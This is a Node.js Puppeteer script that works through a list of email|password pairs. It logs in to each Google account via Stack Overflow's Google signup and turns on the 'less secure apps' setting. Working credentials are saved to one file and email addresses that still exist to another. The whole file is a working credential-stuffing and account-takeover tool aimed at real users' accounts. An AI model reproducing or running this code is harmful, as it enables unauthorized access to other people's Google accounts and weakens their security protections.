/**
 * @LessSecure | WibuHeker
 * Powered By XaiSyndicate.id
 * npm install puppeteer colors fs
 * node file.js LIST.txt
 */
const Pupet = require('puppeteer');
const Colors = require('colors');
const fs = require('fs');
var Counter;
var Empass;
var Total = 0;
var C = 1;
const LessSecure = async () => {
    if (Counter >= Total) {
        console.log(Colors.blue('[DONE]'));
        process.exit();
    }
    const [user, pass] = Empass[Counter].split('|', 2);
    const Browser = await Pupet.launch({
        args: ['--no-sandbox'],
        headless: false
    });
    const Page = await Browser.newPage()
    await Page.goto('https://stackoverflow.com/users/signup?ssrc=head&returnurl=%2fusers%2fstory%2fcurrent', { waitUntil: 'networkidle0'})
    try {
        await (await Page.waitForXPath('//*[@id="openid-buttons"]/button[1]', { timeout: 3000})).click();
        try {
            await (await Page.waitForXPath('//*[@id="identifierId"]', { timeout: 3000  })).type(user);
            await (await Page.waitForXPath('//*[@id="identifierNext"]/span')).click();
            await Page.waitFor(3000);
            try {
                await Page.keyboard.type(pass)
                await Page.keyboard.press(String.fromCharCode(13))
                await Page.waitFor(3000);
                await Page.goto('https://myaccount.google.com/lesssecureapps?pli=1');
                await Page.waitFor(3000);
                if (await Page.$('#yDmH0d > c-wiz > div > div:nth-child(3) > c-wiz > div > div.hyMrOd > div:nth-child(1) > div > div > div > div.N9Ni5 > div > div.rbsY8b > div') !== null) {
                    await Page.click('#yDmH0d > c-wiz > div > div:nth-child(3) > c-wiz > div > div.hyMrOd > div:nth-child(1) > div > div > div > div.N9Ni5 > div > div.rbsY8b > div');
                    console.log(`${Colors.green('[SUCCESS]')} [${C}/${Total}] ${user} | ${pass}`);
                    fs.appendFileSync('SUCCESS_LESSSECURE.txt', Empass[Counter] + "\n");
                } else {
                    console.log(`${Colors.red('[PasswordWrong]')} [${C}/${Total}] ${user} | ${pass}`);
                    fs.appendFileSync('Live_Email.TXT', user + "\n");
                }
            } catch (e) {
                console.log(`${Colors.red('[UserNotFound]')} [${C}/${Total}] ${user} | ${pass}`);
            }
        } catch (e) {
            console.log(`${Colors.red('[Failed]')} [${C}/${Total}] ${user} | ${pass}`);
        }
    } catch (e) {
        console.log(`${Colors.red('[Failed]')} [${C}/${Total}] ${user} | ${pass}`);
    }
    Counter++;
    C++;
    Browser.close();
    await LessSecure();
}
(async () => {
    Empass = fs.readFileSync(process.argv[2], 'utf8').split('\n');
    Total = Empass.length;
    Counter = 0;
    await LessSecure();
})();
